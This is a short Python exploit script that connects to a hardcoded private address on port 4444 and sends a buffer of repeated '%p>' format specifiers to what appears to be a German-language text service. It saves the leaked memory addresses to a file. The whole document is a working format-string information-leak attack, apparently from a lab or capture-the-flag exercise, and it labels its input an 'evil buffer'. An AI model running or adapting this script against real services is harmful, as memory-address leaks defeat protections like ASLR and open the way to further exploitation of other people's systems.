#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def leakedAddresses():
    numberOfChars = 172
    char = b"%p>"
    buffer = char * numberOfChars
    fileName = 'leaked_adresses_1.txt'

    startLenght = 20
    bufferLenght = numberOfChars * 9 + startLenght

    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address
    s.recv(1024)
    s.send(bytes('C \r\n', 'utf-8'))
    s.recv(1024)
    s.send(buffer + bytes('\r\n', 'utf-8'))
    data = b""

    while(len(data)<bufferLenght):
        data += s.recv(bufferLenght)

    s.send(bytes('n\r\n', 'utf-8')) # evil buffer
    s.close()

    # remove unnecessary line which are send by the server
    string = data.decode("utf-8")
    string = string.replace("Neuer Topic: ", "")
    string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")
    string = string.replace(">", "\r\n")

    # write into the file
    f = open(fileName, "w")
    f.write(string)
    f.close()

def main():
    leakedAddresses()

main()